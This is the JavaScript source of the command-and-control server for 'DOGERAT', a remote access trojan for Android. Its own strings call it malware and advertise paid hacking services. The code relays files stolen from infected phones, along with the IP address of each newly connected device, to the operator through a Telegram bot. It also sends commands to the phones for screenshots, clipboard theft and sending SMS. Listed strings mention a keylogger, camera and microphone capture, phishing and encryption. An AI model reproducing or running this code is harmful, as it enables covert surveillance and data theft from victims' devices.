const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data.token, { polling: true, request: {} });
const appData = new Map();

const actions = [
  'file',
  'sockets',
  'log',
  '✯ Клипборд ✯',
  'express',
  '<b>✯ Введите номер телефона, который вы хотите отправить СМС</b>\n\n',
  '<b>✯ Новое устройство подключено</b>\n\n',
  'multer',
  '✯ Отправить СМС всем контактам ✯',
  '84cPlils',
  '<b>✯ Главное меню</b>\n\n',
  '<b>версия</b> → ',
  'listen',
  'readFileSync',
  '<b>✯ Выберите действие для выполнения для всех доступных устройств</b>\n\n',
  'popNotification',
  'shift',
  '3234gTfIoe',
  'time',
  'all-sms',
  'no information',
  '1892960kuvEMZ',
  'vibrateDuration',
  'emit',
  '✯ Действие ✯',
  'contacts',
  'size',
  '3961580aPaxKE',
  '✯ Отмена действия ✯',
  '/text',
  '✯ Главная камера ✯',
  'all',
  'smsNumber',  '<b>✯ Введите текст, который вы хотите отправить всем целевым контактам</b>\n\n',
  'toast',
  'currentNotificationText',
  '2169665ymIjdB',
  '3426UnzfvN',
  'get',
  '✯ СМС ✯',
  '3539044apenns',
  '<b>✯ Сообщение получено от → </b>',
  '✯ Назад в главное меню ✯',
  '✯ Декрипт ✯',
  '<b>✯ Устройство отключено</b>\n\n',
  'currentNumber',
  'set',
  'selfie-camera',
  'http',
  '<b>✯ Нет подключенных устройств</b>\n\n',
  '14859208ppOnuo',
  'originalname',
  'Разработано bởi: @CYBERSHIELDX',
  ' Устройства ✯',
  'single',
  'post',
  '<b>✯ Запрос был выполнен успешно, вы получите ответ устройства скоро...</b>\n\n✯ Вернуться в главное меню</b>\n\n',
  '✯ Кейлоггер ВКЛ ✯',
  '/start',
  'currentTarget',
  '✯ Устройства ✯',
  'smsToAllContacts',
  'disconnect',
  'handshake',
  'duration',
  'toastText',
  '✯ Остановить Аудио ✯',
  'text',
  'DOGERAT — это вредоносное ПО для контроля Android-устройств\nЛюбое неправильное использование является ответственностью лица!\n\n',
  '<b>Устройство </b>',
  '<b>✯ Выберите действие для выполнения для </b>',
  'notificationText',
  '✯ Скриншот ✯',
  '✯ Вибрировать ✯',
  '<b>✯ Введите текст, который вы хотите отобразить как уведомление</b>\n\n',
  '18HiKXqZ',
  'PORT',
  'keylogger-off',
  '<b>ip</b> → ',
  'currentAction',
  '✯ О нас ✯',
  'calls',
  'url',  '628531Xzwdkr',
  'commend',
  'Done',
  '5UQRBbM',
  '157863kmaaoD',
  'env',
  'token',
  '✯ Галерея ✯',
  '✯ Звонки ✯',
  'createServer',
  'textToAllContacts',
  '6831234vSnSLj',
  '✯ Воспроизвести аудио ✯',
  'sendMessage',
  'utf8',
  'smsText',
  'headers',
  '✯ Фишинг ✯',
  '/upload',
  '✯ Энкрипт ✯',
  'forEach',
  '232370LYMeOO',
  '2414186GnuxVX',
  '<b>✯ Введите длительность записи микрофона в секундах</b>\n\n',
  '*/*',
  'keylogger-on',
  'delete',
  '1292HGSYoP',
  'socket.io',
  '<b>время</b> → ',
  'HTML',
  'ping',
  '<b>✯ Добро пожаловать в DOGERAT</b>\n\n',
  'apps',
  'microphoneDuration',
  '2111820yZWyTe',
  '<b>модель</b> → ',
  '<b>✯ Введите сообщение, которое вы хотите отобразить в тост-боксе</b>\n\n',
  '721588iBLdHC',
  '✯ Открыть URL ✯',
  'buffer',
  'send',
  '<b>✯ Если вы хотите нанять нас для любой платной работы, свяжитесь с @sphanter\nМы взламываем, мы утечка, мы делаем вредоносное ПО\n\nТелеграм → @CUBERSHIELDX\nАдмин → @SPHANTER</b>\n\n',
  '\n\nСообщение → </b>',
  '✯ Тост ✯',
  'sendSms',
  './data.json',
  'https',
  '<b>✯ Подключенные устройства: </b>',
  '7207620ZaPjbY',  '✯ Файловый проводник ✯',
  'connection',
  'push',
  '✯ Кейлоггер ВЫКЛ ✯',
  '✯ Селфи-камера ✯',
  'error',
  '<b>✯ Сейчас введите сообщение, которое вы хотите отправить на </b>',
  'model',
  '<b>✯ Эта опция доступна только в премиум-версии, купите у @sphanter</b>\n\n',
  '✯ Микрофон ✯',
  '✯ Контакты ✯',
  'main-camera',
  '</b>\n\n',
  '✯ Отправить СМС ✯',
  '12AEDsDj',
  '✯ Приложения ✯',
  'vibrate'
];

app.post('/upload', uploader.single('file'), (req, res) => {
  const fileName = req.file.originalname;
  const fileContent = req.file.buffer.toString('base64');
  bot.sendDocument(data.id, fileContent, {
    caption: `<b>✯ Файл получен от → ${fileName}</b>`,
    parse_mode: 'HTML'
  }, {
    filename: fileName,
    contentType: 'application/octet-stream'
  });
  res.send('Done');
});

app.get('/handshake', (req, res) => {
  res.send(data.id);
});

io.on('connection', socket => {
  let deviceId = socket.handshake.headers['user-agent'] + '-' + io.sockets.sockets.size || 'unknown';
  let deviceInfo = socket.handshake.query.info || 'no information';
  let ip = socket.handshake.address || 'unknown';

  socket.deviceId = deviceId;
  socket.deviceInfo = deviceInfo;

  bot.sendMessage(data.id, `<b>Устройство </b><b>${deviceId}</b>\n<b>Модель:</b> ${deviceInfo}\n<b>IP:</b> ${ip}\n<b>Время:</b> ${new Date().toISOString()}\n\n`, {
    parse_mode: 'HTML'
  });

  socket.on('disconnect', () => {
    bot.sendMessage(data.id, `<b>✯ Устройство отключено</b>\n\n<b>ID:</b> ${deviceId}`, {      parse_mode: 'HTML'
    });
  });

  socket.on('message', msg => {
    bot.sendMessage(data.id, `${deviceId} → ${msg}`, {
      parse_mode: 'HTML'
    });
  });
});

bot.on('message', msg => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === '/start') {
    bot.sendMessage(chatId, `<b>✯ Добро пожаловать в DOGERAT</b>\n\nРазработано bởi: @CYBERSHIELDX\n\nЕсли вы хотите нанять нас — @sphanter`, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Устройства ✯', '✯ Все ✯'], ['✯ О нас ✯']],
        resize_keyboard: true
      }
    });
  } else if (text === '✯ Устройства ✯') {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(chatId, '<b>✯ Нет подключенных устройств</b>\n\n', { parse_mode: 'HTML' });
    } else {
      let list = '<b>✯ Подключенные устройства: </b>\n\n';
      let i = 1;
      io.sockets.sockets.forEach(socket => {
        list += `<b>${i}.</b> ${socket.deviceId}\n<b>Модель:</b> ${socket.deviceInfo}\n<b>IP:</b> ${socket.handshake.address}\n\n`;
        i++;
      });
      bot.sendMessage(chatId, list, { parse_mode: 'HTML' });
    }
  } else if (text === '✯ Все ✯') {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(chatId, '<b>✯ Нет подключенных устройств</b>\n\n', { parse_mode: 'HTML' });
    } else {
      bot.sendMessage(chatId, '<b>✯ Выберите устройство для выполнения действия</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: Array.from(io.sockets.sockets.keys()).map(id => [`✯ ${id} ✯`]),
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  } else if (text.startsWith('✯ ') && text.endsWith(' ✯')) {
    const targetId = text.replace('✯ ', '').replace(' ✯', '');    appData.set('currentTarget', targetId);
    bot.sendMessage(chatId, '<b>✯ Выберите действие для выполнения для всех доступных устройств</b>\n\n', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [
          ['✯ Скриншот ✯', '✯ Клипборд ✯'],
          ['✯ СМС ✯', '✯ Звонки ✯'],
          ['✯ Приложения ✯', '✯ Контакты ✯'],
          ['✯ WiFi ✯', '✯ Микрофон ✯'],
          ['✯ Вибрировать ✯', '✯ Перезагрузка ✯'],
          ['✯ Назад в главное меню ✯']
        ],
        resize_keyboard: true
      }
    });
  } else if (text === '✯ Назад в главное меню ✯') {
    appData.delete('currentTarget');
    bot.sendMessage(chatId, '<b>✯ Главное меню</b>\n\n', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ Устройства ✯', '✯ Все ✯'], ['✯ О нас ✯']],
        resize_keyboard: true
      }
    });
  } else if (text === '✯ Скриншот ✯') {
    const target = appData.get('currentTarget');
    if (target) {
      io.to(target).emit('command', { request: 'screenshot' });
      bot.sendMessage(chatId, '<b>✯ Запрос был выполнен успешно, вы получите ответ устройства скоро...</b>\n\n✯ Вернуться в главное меню</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Назад в главное меню ✯']],
          resize_keyboard: true
        }
      });
    }
  } else if (text === '✯ Клипборд ✯') {
    const target = appData.get('currentTarget');
    if (target) {
      io.to(target).emit('command', { request: 'clipboard' });
      bot.sendMessage(chatId, '<b>✯ Запрос был выполнен успешно, вы получите ответ устройства скоро...</b>\n\n✯ Вернуться в главное меню</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Назад в главное меню ✯']],
          resize_keyboard: true
        }
      });
    }
  } else if (text === '✯ СМС ✯') {
    const target = appData.get('currentTarget');    if (target) {
      bot.sendMessage(chatId, '<b>✯ Введите номер телефона, который вы хотите отправить СМС</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Отмена действия ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
      appData.set('currentAction', 'sendSms');
    }
  } else if (appData.get('currentAction') === 'sendSms') {
    const target = appData.get('currentTarget');
    if (target) {
      io.to(target).emit('command', { request: 'sendSms', args: [text] });
      appData.delete('currentAction');
      bot.sendMessage(chatId, '<b>✯ Запрос был выполнен успешно, вы получите ответ устройства скоро...</b>\n\n✯ Вернуться в главное меню</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ Назад в главное меню ✯']],
          resize_keyboard: true
        }
      });
    }
  } else {
    bot.sendMessage(chatId, 'Неизвестная команда', { parse_mode: 'HTML' });
  }
});

server.listen(3000, () => {
  console.log('listening on port 3000');
});